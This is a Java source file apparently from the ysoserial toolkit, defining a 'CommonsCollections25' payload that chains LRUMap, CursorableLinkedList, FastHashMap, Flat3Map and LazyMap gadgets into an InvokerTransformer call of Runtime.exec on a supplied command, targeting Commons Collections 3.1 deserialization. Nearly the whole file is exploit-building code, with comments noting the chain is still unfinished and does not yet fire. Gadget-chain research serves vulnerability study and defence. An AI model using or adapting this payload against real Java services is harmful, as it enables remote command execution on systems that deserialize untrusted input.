package ysoserial.payloads;

import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.list.CursorableLinkedList;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.map.LRUMap;
import org.apache.commons.collections.map.ReferenceIdentityMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;

/*
    Cluster1_20220605-162453, first chain.
	Gadget chain:

        chain_LRUMap31-readObject-8dc29009dfb7c41b1b32c8d8fccf12a2c1259fb2.txt
            [
         <org.apache.commons.collections.map.LRUMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.CursorableLinkedList: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.FastHashMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections:3.1"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections25 extends PayloadRunner implements ObjectPayload<LRUMap> {
    enum ProvaEnum {
        zZ,
        yy
    }

    public LRUMap getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        //Object templates = Gadgets.createTemplatesImpl(command);

        // setup harmless chain
        //final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // LazyMap.get() it should be called with an input parameter that is a key not already existing in the map, so that the transformer will be called on that key.
//        LazyMap.get();
        // The InvokerTransformer should be set as the LazyMap transformer (via reflection or lazyMap method).
        // The LazyMap.get should be called via Flat3Map.equals, to do so the input parameter of equals should be a LazyMap,
        //  and the LazyMap should not contain a key existing in the Flat3Map, the LazyMap.get will be called with the key
        //  of the Flat3Map as input parameter
//        Flat3Map;
        // Flat3Map.equals should be called by FastHashMap.equals, to do so the input parameter should be a map with a value of LazyMap
        //  where his key should be the same key contained in the FastHashMap (not sure about the key thing).
//        FastHashMap
        // FastHashMap.equals should be called by CursorableLinkedList.equals, to do so the input parameter should be a
        //  list with a map containing the LazyMap as value of a key. And the CursorableLinkedList should contain a FastHashMap.
//        CursorableLinkedList
        // CursorableLinkedList.equals should be called by AbstractHashedMap.isEqualKey, to do so two different objects "key" that results
        //  or not equal in an equals method should be passed as parameters of the isEqualKey method.
//        AbstractHashedMap;
        // AbstractHashedMap.isEqualKey should be called by AbstractHashedMap.put, so the insertion of an object should fire the isEqualKey check.
        //  To do so we should have data not null inside the AbstractHashMap and then the method isEqualKey would be called with as parameter:
        //  the input key of the put parameter and a key from the AbstractHashMap entry analyzed, so the map must contain at least
        //  another entry different from the one we are trying to insert at this moment.
        // AbstractHashedMap.put should be called by AbstractHashedMap.doReadObject, so put is called when the AbstractHashedMap
        //  object is deserialized, and it's content in byte is read and put inside the map.
        // AbstractHashedMap.doReadObject is called by LRUMap.doReadObject via super.doReadObject(input parameter)
        // Lastly LRUMap.doReadObject is called by LRUMap.readObject during the normal deserialization process.
//        LRUMap;

        //Object object = new Object();
        //EnumMap enumMap = new EnumMap(object);

        /* Map<Object, Object> lazyMap = LazyMap.lazyMap(new LRUMap<Object, Object>(), transformer);
        lazyMap.put(templates, templates);
        Object templ = lazyMap.get(templates);*/

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map innerMap3 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        /* LRUMap<Object, Object> outputLRUMap = new LRUMap<Object, Object>();
        //outputLRUMap.put(templates, templates);
        Flat3Map<String, Integer> flat3map1 = new Flat3Map<String, Integer>();
        flat3map1.put("zZ", 1);
        flat3map1.put("yy", 1);
        outputLRUMap.put(flat3map1, 1); */

        //Object templates2 = Gadgets.createTemplatesImpl(command);
        /*Object templates2 = templates;
        //outputLRUMap.put(templates2, templates2);
        Flat3Map<String, Integer> flat3map2 = new Flat3Map<String, Integer>();
        flat3map2.put("zZ", 1);
        outputLRUMap.put(flat3map2, 2);*/
        Flat3Map flat3map1 = new Flat3Map();
        flat3map1.put("yy", 1);
        Flat3Map flat3map2 = new Flat3Map();
        flat3map2.put("zZ", 1);

        FastHashMap fastHashMap1 = new FastHashMap();
        fastHashMap1.put("yy", flat3map1); // lazyMap1, 1
        // TODO prova a mettere yy e zZ come chiavi
        //flat3map1.put(flat3map1, 1);

        FastHashMap fastHashMap2 = new FastHashMap();
        fastHashMap2.put("yy", flat3map2); // 1 , forse la prima deve essere la lazyMap1
        //flat3map2.put(flat3map2, 2);
        CursorableLinkedList cursorableLinkedList1 = new CursorableLinkedList();
        cursorableLinkedList1.add(fastHashMap1);
        CursorableLinkedList cursorableLinkedList2 = new CursorableLinkedList();
        cursorableLinkedList2.add(fastHashMap2);


        /*EnumMap enumMap2 = new EnumMap(lazyMap1);
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, new Object());*/

        // Use the colliding Maps as keys in ReferenceIdentityMap
        /*ReferenceIdentityMap referenceIdentityMap = new ReferenceIdentityMap();
        referenceIdentityMap.put(cursorableLinkedList1, 1);
        referenceIdentityMap.put(cursorableLinkedList2, 2);*/
        LRUMap outputLRUMap = new LRUMap();
        outputLRUMap.put(cursorableLinkedList1, 1);
        outputLRUMap.put(cursorableLinkedList2, 2);

        // the problem is in:  @Override
        //    public V put(final K key, final V value) {
        //        final Object convertedKey = convertKey(key);
        //        final int hashCode = hash(convertedKey);
        //        final int index = hashIndex(hashCode, data.length);
        //        HashEntry<K, V> entry = data[index];
        //        while (entry != null) {
        //            if (entry.hashCode == hashCode && isEqualKey(convertedKey, entry.key)) {
        //                final V oldValue = entry.getValue();
        //                updateEntry(entry, value);
        //                return oldValue;
        //            }
        //            entry = entry.next;
        //        }
        //
        //        addMapping(index, hashCode, key, value);
        //        return null;
        //    }
        // Because the entry is always null so it doesn't call isEqualKey
        // Think if it's possible to do something similar to the colliding hashes of CommonsCollections7.

        // define the comparator used for sorting
       // TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
      //  TreeBag tree = new TreeBag(comp);
      //  tree.add(templates);

        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return outputLRUMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections25.class, args);
    }

}
